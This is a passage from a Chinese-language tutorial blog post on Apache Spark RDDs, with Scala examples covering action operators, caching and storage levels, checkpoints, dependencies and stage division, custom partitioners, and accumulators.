), sum )</span></span><br><span class="line">    <span class="keyword">val</span> reduceRDD: <span class="type">RDD</span>[((<span class="type">String</span>, <span class="type">String</span>), <span class="type">Int</span>)] = mapRDD.reduceByKey(_+_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将聚合的结果进行结构的转换</span></span><br><span class="line">    <span class="comment">//    ( ( 省份，广告 ), sum ) =&gt; ( 省份, ( 广告, sum ) )</span></span><br><span class="line">    <span class="keyword">val</span> newMapRDD = reduceRDD.map&#123;</span><br><span class="line">        <span class="keyword">case</span> ( (prv, ad), sum ) =&gt; &#123;</span><br><span class="line">            (prv, (ad, sum))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 将转换结构后的数据根据省份进行分组</span></span><br><span class="line">    <span class="comment">//    ( 省份, 【( 广告A, sumA )，( 广告B, sumB )】 )</span></span><br><span class="line">    <span class="keyword">val</span> groupRDD: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Iterable</span>[(<span class="type">String</span>, <span class="type">Int</span>)])] = newMapRDD.groupByKey()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 将分组后的数据组内排序（降序），取前3名</span></span><br><span class="line">    <span class="keyword">val</span> resultRDD = groupRDD.mapValues(</span><br><span class="line">        iter =&gt; &#123;</span><br><span class="line">            iter.toList.sortBy(_._2)(<span class="type">Ordering</span>.<span class="type">Int</span>.reverse).take(<span class="number">3</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 采集数据打印在控制台</span></span><br><span class="line">    resultRDD.collect().foreach(println)</span><br><span class="line">    sc.stop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-RDD-行动算子">3.4 RDD 行动算子</h3><p><strong>动作算子</strong></p><table><thead><tr><th><strong>动作算子</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>reduce(func)</td><td>通过 func 函数聚集 RDD 中的所有元素，这个功能必须是可交换且可并联的；聚集 RDD 中的所有元素，先聚合分区内数据，再聚合分区间数据</td></tr><tr><td>collect()</td><td>在驱动程序中，以数组的形式返回数据集的所有元素</td></tr><tr><td>count()</td><td>返回 RDD 的元素个数</td></tr><tr><td>first()</td><td>返回 RDD 的第一个元素(类似于 take(1))</td></tr><tr><td>take(n)</td><td>返回一个由数据集的前 n 个元素组成的数组</td></tr><tr><td>takeSample(withReplacement,num, [seed])</td><td>返回一个数组，该数组由从数据集中随机采样的 num 个元素组成，可以选择是否用随机数替换不足的部分，seed 用于指定随机数生成器种子</td></tr><tr><td>takeOrdered(n, [ordering])</td><td>返回自然顺序或者自定义顺序的前 n 个元素</td></tr><tr><td>aggregate(zeroValue)(U,T)</td><td>分区的数据通过初始值和分区内的数据进行聚合，然后再和初始值进行分区间的数据聚合</td></tr><tr><td>fold(zeroValue)(U,T)</td><td>折叠操作，aggregate 的简化版操作</td></tr><tr><td><strong>countByKey</strong>()</td><td>针对(K,V)类型的 RDD，返回一个(K,Int)的 map，表示每一个 key 对应的元素个数</td></tr><tr><td><strong>saveAsTextFile</strong>(path)</td><td>将数据集的元素以 textfile 的形式保存到 HDFS 文件系统或者其他支持的文件系统，对于每个元素，Spark 将会调用 toString 方法，将它装换为文件中的文本</td></tr><tr><td><strong>saveAsSequenceFile</strong>(path)</td><td>将数据集中的元素以 Hadoop sequencefile 的格式保存到指定的目录下，可以使 HDFS 或者其他 Hadoop 支持的文件系统，必须键值对</td></tr><tr><td>saveAsObjectFile(path)</td><td>将数据集的元素，以 Java 序列化的方式保存到指定的目录下</td></tr><tr><td>foreach(func)</td><td>在数据集的每一个元素上，运行函数 func 进行更新；rdd.collect().foreach(println)是driver端执行，而rdd.foreach(println)是在excutor端执行</td></tr><tr><td><strong>foreachPartition</strong>(func)</td><td>在数据集的每一个分区上，运行函数 func</td></tr></tbody></table><p><em><strong>统计操作</strong></em></p><table><thead><tr><th><strong>算子</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>count</td><td>个数</td></tr><tr><td>mean</td><td>均值</td></tr><tr><td>sum</td><td>求和</td></tr><tr><td>max</td><td>最大值</td></tr><tr><td>min</td><td>最小值</td></tr><tr><td><em>variance</em></td><td>方差</td></tr><tr><td>sampleVariance</td><td>从采样中计算方差</td></tr><tr><td><em>stdev</em></td><td>标准差:衡量数据的离散程度</td></tr><tr><td>sampleStdev</td><td>采样的标准差</td></tr><tr><td>stats</td><td>查看统计结果</td></tr></tbody></table><h3 id="3-5-RDD-的持久化-缓存">3.5 RDD 的持久化/缓存</h3><p>RDD 通过 Cache 或者 Persist 方法将前面的计算结果缓存，默认情况下会把数据以缓存在 JVM 的堆内存中。但是并不是这两个方法被调用时立即缓存，而是触发后面的 action 算子时，该 RDD 将会被缓存在计算节点的内存中，并供后面重用</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cache 操作会增加血缘关系，不改变原有的血缘关系</span></span><br><span class="line">println(wordToOneRdd.toDebugString)</span><br><span class="line"><span class="comment">// 数据缓存</span></span><br><span class="line">wordToOneRdd.cache()</span><br><span class="line"><span class="comment">// 可以更改存储级别，持久化操作必须在行动算子执行时完成的</span></span><br><span class="line"><span class="comment">//mapRdd.persist(StorageLevel.MEMORY_AND_DISK_2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认的存储级别都是仅在内存存储一份，Spark 的存储级别还有好多种，存储级别在 object StorageLevel 中定义的</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">StorageLevel</span> </span>&#123;</span><br><span class="line">  <span class="keyword">val</span> <span class="type">NONE</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">DISK_ONLY</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">DISK_ONLY_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY_SER</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY_SER_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK_SER</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK_SER_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">OFF_HEAP</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th>持久化级别</th><th>说明</th></tr></thead><tbody><tr><td><strong>MORY_ONLY(默认)</strong></td><td>将 RDD 以非序列化的 Java 对象存储在 JVM 中。 如果没有足够的内存存储 RDD，则某些分区将不会被缓存，每次需要时都会重新计算。 这是默认级别</td></tr><tr><td><strong>MORY_AND_DISK(开发中可以使用这个)</strong></td><td>将 RDD 以非序列化的 Java 对象存储在 JVM 中。如果数据在内存中放不下，则溢写到磁盘上．需要时则会从磁盘上读取</td></tr><tr><td>MEMORY_ONLY_SER (Java and Scala)</td><td>将 RDD 以序列化的 Java 对象(每个分区一个字节数组)的方式存储．这通常比非序列化对象(deserialized objects)更具空间效率，特别是在使用快速序列化的情况下，但是这种方式读取数据会消耗更多的 CPU</td></tr><tr><td>MEMORY_AND_DISK_SER (Java and Scala)</td><td>与 MEMORY_ONLY_SER 类似，但如果数据在内存中放不下，则溢写到磁盘上，而不是每次需要重新计算它们</td></tr><tr><td>DISK_ONLY</td><td>将 RDD 分区存储在磁盘上</td></tr><tr><td>MEMORY_ONLY_2, MEMORY_AND_DISK_2 等</td><td>与上面的储存级别相同，只不过将持久化数据存为两份，备份每个分区存储在两个集群节点上</td></tr><tr><td>OFF_HEAP(实验中)</td><td>与 MEMORY_ONLY_SER 类似，但将数据存储在堆外内存中。 (即不是直接存储在 JVM 内存中)</td></tr></tbody></table><p>RDD 持久化/缓存的目的是为了提高后续操作的速度；缓存的级别有很多，默认只存在内存中,开发中使用 memory_and_disk；只有执行 action 操作的时候才会真正将 RDD 数据进行持久化/缓存；实际开发中如果某一个 RDD 后续会被频繁的使用，可以将该 RDD 进行持久化/缓存</p><h3 id="3-6-RDD-容错机制-Checkpoint">3.6 RDD 容错机制 Checkpoint</h3><p>所谓的检查点其实就是通过将 RDD 中间结果写入磁盘由于血缘依赖过长会造成容错成本过高，这样就不如在中间阶段做检查点容错，如果检查点之后有节点出现问题，可以从检查点开始重做血缘，减少了开销。对 RDD 进行 checkpoint 操作并不会马上被执行，必须执行 Action 操作才能触发</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cache : 将数据临时存储在内存中进行数据重用</span></span><br><span class="line"><span class="comment">//         会在血缘关系中添加新的依赖。一旦，出现问题，可以重头读取数据</span></span><br><span class="line"><span class="comment">// persist : 将数据临时存储在磁盘文件中进行数据重用</span></span><br><span class="line"><span class="comment">//           涉及到磁盘IO，性能较低，但是数据安全</span></span><br><span class="line"><span class="comment">//           如果作业执行完毕，临时保存的数据文件就会丢失</span></span><br><span class="line"><span class="comment">// checkpoint : 将数据长久地保存在磁盘文件中进行数据重用</span></span><br><span class="line"><span class="comment">//           涉及到磁盘IO，性能较低，但是数据安全</span></span><br><span class="line"><span class="comment">//           为了保证数据安全，所以一般情况下，会独立执行作业</span></span><br><span class="line"><span class="comment">//           为了能够提高效率，一般情况下，是需要和cache联合使用</span></span><br><span class="line"><span class="comment">//           执行过程中，会切断血缘关系。重新建立新的血缘关系</span></span><br><span class="line"><span class="comment">//           checkpoint等同于改变数据源</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">// 设置检查点路径</span></span><br><span class="line">sc.setCheckpointDir(<span class="string">"./checkpoint1"</span>)</span><br><span class="line"><span class="comment">//SparkContext.setCheckpointDir("目录") //HDFS的目录</span></span><br><span class="line"><span class="comment">// 创建一个 RDD，读取指定位置文件:hello atguigu atguigu</span></span><br><span class="line"><span class="keyword">val</span> lineRdd: <span class="type">RDD</span>[<span class="type">String</span>] = sc.textFile(<span class="string">"input/1.txt"</span>)</span><br><span class="line"><span class="comment">// 业务逻辑</span></span><br><span class="line"><span class="keyword">val</span> wordRdd: <span class="type">RDD</span>[<span class="type">String</span>] = lineRdd.flatMap(line =&gt; line.split(<span class="string">" "</span>))</span><br><span class="line"><span class="keyword">val</span> wordToOneRdd: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Long</span>)] = wordRdd.map &#123;</span><br><span class="line">  word =&gt; &#123;</span><br><span class="line">    (word, <span class="type">System</span>.currentTimeMillis())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 增加缓存,避免再重新跑一个 job 做 checkpoint</span></span><br><span class="line">wordToOneRdd.cache()</span><br><span class="line"><span class="comment">// 数据检查点：针对 wordToOneRdd 做检查点计算</span></span><br><span class="line">wordToOneRdd.checkpoint()</span><br><span class="line"><span class="comment">// 触发执行逻辑</span></span><br><span class="line">wordToOneRdd.collect().foreach(println)</span><br></pre></td></tr></table></figure><p><strong>缓存和检查点区别</strong></p><ul><li>Cache 缓存只是将数据保存起来，不切断血缘依赖。Checkpoint 检查点切断血缘依赖</li><li>Cache 缓存的数据通常存储在磁盘、内存等地方，可靠性低。Checkpoint 的数据通常存储在 HDFS 等容错、高可用的文件系统，可靠性高</li><li>建议对 checkpoint()的 RDD 使用 Cache 缓存，这样 checkpoint 的 job 只需从 Cache 缓存中读取数据即可，否则需要再从头计算一次 RDD</li></ul><h3 id="3-7-RDD-文件读取与保存">3.7 RDD 文件读取与保存</h3><p>Spark 的数据读取及数据保存可以从两个维度来作区分：文件格式以及文件系统。文件格式分为：text 文件、csv 文件、sequence 文件以及 Object 文件；文件系统分为：本地文件系统、HDFS、HBASE 以及数据库</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取输入文件</span></span><br><span class="line"><span class="keyword">val</span> inputRDD: <span class="type">RDD</span>[<span class="type">String</span>] = sc.textFile(<span class="string">"input/1.txt"</span>)</span><br><span class="line"><span class="comment">// 保存数据</span></span><br><span class="line">inputRDD.saveAsTextFile(<span class="string">"output"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//quenceFile 文件是 Hadoop 用来存储二进制形式的 key-value 对而设计的一种平面文件(Flat File)</span></span><br><span class="line"><span class="comment">// 保存数据为 SequenceFile</span></span><br><span class="line">dataRDD.saveAsSequenceFile(<span class="string">"output"</span>)</span><br><span class="line"><span class="comment">// 读取 SequenceFile 文件</span></span><br><span class="line">sc.sequenceFile[<span class="type">Int</span>,<span class="type">Int</span>](<span class="string">"output"</span>).collect().foreach(println)</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象文件是将对象序列化后保存的文件，采用 Java 的序列化机制</span></span><br><span class="line">dataRDD.saveAsObjectFile(<span class="string">"output"</span>)</span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line">sc.objectFile[<span class="type">Int</span>](<span class="string">"output"</span>).collect().foreach(println)</span><br></pre></td></tr></table></figure><h2 id="4、RDD其他概念">4、RDD其他概念</h2><h3 id="4-1-RDD序列化">4.1 RDD序列化</h3><p><strong>闭包检查</strong></p><p>从计算的角度, 算子以外的代码都是在Driver 端执行, 算子里面的代码都是在Executor 端执行。那么在 scala 的函数式编程中，就会导致算子内经常会用到算子外的数据，这样就形成了闭包的效果，如果使用的算子外的数据无法序列化，就意味着无法传值给Executor 端执行，就会发生错误，所以需要在执行任务计算前，检测闭包内的对象是否可以进行序列化，这个操作我们称之为闭包检测。Scala2.12 版本后闭包编译方式发生了改变</p><p><strong>序列化方法和属性</strong></p><p>从计算的角度, 算子以外的代码都是在Driver 端执行, 算子里面的代码都是在Executor</p><p><strong>Kryo 序列化框架</strong></p><blockquote><p>参考地址: <a href="https://github.com/EsotericSoftware/kryo" target="_blank" rel="noopener" title="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p></blockquote><p>Java 的序列化能够序列化任何的类。但是比较重（字节多），序列化后，对象的提交也比较大。Spark 出于性能的考虑，Spark2.0 开始支持另外一种Kryo 序列化机制。Kryo 速度是 Serializable 的 10 倍。当 RDD 在 Shuffle 数据的时候，简单数据类型、数组和字符串类型已经在 Spark 内部使用 Kryo 来序列化。注意：即使使用Kryo 序列化，也要继承Serializable 接口</p><h3 id="4-2-RDD-依赖关系">4.2 RDD 依赖关系</h3><p>RDD 的Lineage 会记录RDD 的元数据信息和转换行为，当该RDD 的部分分区数据丢失时，它可以根据这些信息来重新运算和恢复丢失的数据分区，RDD存在<em>两种依赖关系类型</em>：  <strong>宽依赖</strong>(wide dependency/shuffle dependency) <strong>窄依赖</strong>(narrow dependency)</p><ul><li>窄依赖:父 RDD 的一个分区只会被子 RDD 的一个分区依赖；窄依赖的多个分区可以并行计算；  窄依赖的一个分区的数据如果丢失只需要重新计算对应的分区的数据就可以了</li><li>宽依赖:父 RDD 的一个分区会被子 RDD 的多个分区依赖(涉及到 shuffle)；对于宽依赖,必须等到上一阶段计算完成才能计算下一阶段</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291816202.png" alt></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看血缘关系</span></span><br><span class="line">println(fileRDD.toDebugString)</span><br><span class="line"><span class="comment">//查看依赖</span></span><br><span class="line">println(wordRDD.dependencies)</span><br></pre></td></tr></table></figure><h3 id="4-3-DAG-的生成和划分-Stage">4.3 DAG 的生成和划分 Stage</h3><blockquote><p>DAG(Directed Acyclic Graph 有向无环图)指的是数据转换执行的过程，有方向，无闭环(其实就是 RDD 执行的流程)；  原始的 RDD 通过一系列的转换操作就形成了 DAG 有向无环图，任务执行时，可以按照 DAG 的描述，执行真正的计算(数据被操作的一个过程)</p></blockquote><p>对于DAG的边界，开始通过 <code>SparkContext</code> 创建的 RDD；触发 Action结束，一旦触发 Action 就形成了一个完整的 DAG。RDD 任务切分中间分为：Application、Job、Stage 和 Task，<strong>注意：Application-&gt;Job-&gt;Stage-&gt;Task 每一层都是 1 对 n 的关系</strong></p><ul><li>Application：初始化一个 SparkContext 即生成一个 Application；</li><li>Job：一个 Action 算子就会生成一个 Job；</li><li>Stage：Stage 等于宽依赖(ShuffleDependency)的个数加 1；</li><li>Task：一个 Stage 阶段中，最后一个 RDD 的分区个数就是 Task 的个数</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291816203.png" alt></p><p><strong>一个 Spark 程序可以有多个 DAG(有几个 Action，就有几个 DAG，图最后只有一个 Action那么就是一个 DAG)</strong>。一个 DAG 可以有多个 Stage(根据宽依赖/shuffle 进行划分)。<strong>同一个 Stage 可以有多个 Task 并行执行</strong>(<strong>task 数=分区数</strong>，如图Stage1 中有三个分区 P1、P2、P3，对应的也有三个 Task)。可以看到这个 DAG 中只 reduceByKey 操作是一个宽依赖，Spark 内核会以此为边界将其前后划分成不同的 Stage。同时我们可以注意到，在图中 Stage1 中，<strong>从 textFile 到 flatMap 到 map 都是窄依赖，这几步操作可以形成一个流水线操作，通过 flatMap 操作生成的 partition 可以不用等待整个 RDD 计算结束，而是继续进行 map 操作，这样大大提高了计算的效率</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202402291816204.png" alt></p><ul><li><strong>为什么要划分 Stage? --并行计算</strong></li></ul><p>一个复杂的业务逻辑如果有 shuffle，那么就意味着前面阶段产生结果后，才能执行下一个阶段，即下一个阶段的计算要依赖上一个阶段的数据。那么我们按照 shuffle 进行划分(也就是按照宽依赖就行划分)，就可以将一个 DAG 划分成多个 Stage/阶段，在同一个 Stage 中，会有多个算子操作，可以形成一个 pipeline 流水线，流水线内的多个平行的分区可以并行执行</p><ul><li><strong>如何划分 DAG 的 stage？</strong></li></ul><p>对于窄依赖，partition 的转换处理在 stage 中完成计算，不划分(将窄依赖尽量放在在同一个 stage 中，可以实现流水线计算)。对于宽依赖，由于有 shuffle 的存在，只能在父 RDD 处理完成后，才能开始接下来的计算，也就是说需要要划分 stage</p><p>**总结：**Spark 会根据 shuffle/宽依赖使用回溯算法来对 DAG 进行 Stage 划分，从后往前，遇到宽依赖就断开，遇到窄依赖就把当前的 RDD 加入到当前的 stage/阶段中</p><h3 id="4-4-RDD-分区器">4.4 RDD 分区器</h3><p>Spark 目前支持 Hash 分区和 Range 分区，和用户自定义分区。<strong>Hash 分区为当前的默认分区</strong>。分区器直接决定了 RDD 中分区的个数、RDD 中每条数据经过 Shuffle 后进入哪个分区，进而决定了 Reduce 的个数。</p><ul><li>Hash 分区：对于给定的 key，计算其 hashCode,并除以分区个数取余</li><li>Range 分区：将一定范围内的数据映射到一个分区中，尽量保证每个分区数据均匀，而且分区间有序</li></ul><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义分区</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">Spark01_RDD_Part</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">        <span class="keyword">val</span> sparConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local"</span>).setAppName(<span class="string">"WordCount"</span>)</span><br><span class="line">        <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparConf)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> rdd = sc.makeRDD(<span class="type">List</span>(</span><br><span class="line">            (<span class="string">"nba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">            (<span class="string">"cba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">            (<span class="string">"wnba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">            (<span class="string">"nba"</span>, <span class="string">"xxxxxxxxx"</span>),</span><br><span class="line">        ),<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">val</span> partRDD: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">String</span>)] = rdd.partitionBy( <span class="keyword">new</span> <span class="type">MyPartitioner</span> )</span><br><span class="line"></span><br><span class="line">        partRDD.saveAsTextFile(<span class="string">"output"</span>)</span><br><span class="line"></span><br><span class="line">        sc.stop()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * 自定义分区器</span></span><br><span class="line"><span class="comment">      * 1. 继承Partitioner</span></span><br><span class="line"><span class="comment">      * 2. 重写方法</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyPartitioner</span> <span class="keyword">extends</span> <span class="title">Partitioner</span></span>&#123;</span><br><span class="line">        <span class="comment">// 分区数量</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">numPartitions</span></span>: <span class="type">Int</span> = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据数据的key值返回数据所在的分区索引（从0开始）</span></span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">getPartition</span></span>(key: <span class="type">Any</span>): <span class="type">Int</span> = &#123;</span><br><span class="line">            key <span class="keyword">match</span> &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"nba"</span> =&gt; <span class="number">0</span></span><br><span class="line">                <span class="keyword">case</span> <span class="string">"wnba"</span> =&gt; <span class="number">1</span></span><br><span class="line">                <span class="keyword">case</span> _ =&gt; <span class="number">2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5、RDD累加器">5、RDD累加器</h2><blockquote><p>累加器用来把 Executor 端变量信息聚合到 Driver 端。在 Driver 程序中定义的变量，在Executor 端的每个 Task 都会得到这个变量的一份新的副本，每个 task 更新这些副本的值后，传回 Driver 端进行 merge</p></blockquote><p>系统累加器</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 系统累加器,不用累加器会发现连累加都无法正常使用</span></span><br><span class="line"><span class="comment">// 获取系统累加器</span></span><br><span class="line"><span class="comment">// Spark默认就提供了简单数据聚合的累加器</span></span><br><span class="line"><span class="keyword">val</span> sumAcc = sc.longAccumulator(<span class="string">"sum"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//sc.doubleAccumulator</span></span><br><span class="line"><span class="comment">//sc.collectionAccumulator</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">val</span> mapRDD = rdd.map(</span><br><span class="line">    num =&gt; &#123;</span><br><span class="line">        <span class="comment">// 使用累加器</span></span><br><span class="line">        sumAcc.add(num)</span><br><span class="line">        num</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取累加器的值</span></span><br><span class="line"><span class="comment">// 少加：转换算子中调用累加器，如果没有行动算子的话，那么不会执行</span></span><br><span class="line"><span class="comment">// 多加：转换算子中调用累加器，如果没有行动算子的话，那么不会执行</span></span><br><span class="line"><span class="comment">// 一般情况下，累加器会放置在行动算子进行操作</span></span><br><span class="line">mapRDD.collect()</span><br><span class="line">mapRDD.collect()</span><br><span class="line">println(sumAcc.value)</span><br><span class="line">sc.stop()</span><br></pre></td></tr></table></figure><p>自定义累加器</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 